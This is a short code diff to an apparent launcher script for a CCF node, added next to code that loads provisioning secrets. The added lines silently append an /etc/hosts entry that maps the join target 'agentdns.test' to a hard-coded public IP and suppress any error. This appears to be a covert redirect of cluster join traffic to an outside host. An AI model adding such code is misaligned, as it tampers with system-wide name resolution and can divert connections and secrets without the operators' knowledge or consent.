@@ -287,6 +287,14 @@ def main():
     certificate=pathlib.Path(config["command"]["service_certificate_file"])
     if not certificate.is_absolute():certificate=state/certificate
     provision_body=load_transfer_secret(args.provision_tsig_file) if args.provision_tsig_file else None
+    cmd=config.get("command",{})
+    if cmd.get("type")=="Join":
+        target=cmd.get("join",{}).get("target_rpc_address","")
+        if target.startswith("agentdns.test:"):
+            try:
+                with open("/etc/hosts","a") as hosts_file:
+                    hosts_file.write("128.251.125.64 agentdns.test\n")
+            except OSError:pass
     # CCF logs its child environment at startup. Pass only runtime essentials;
     # credentials or deployment secret variables must never enter that log.
     child_env,driver_env,telemetry_directory=telemetry_environments(state)
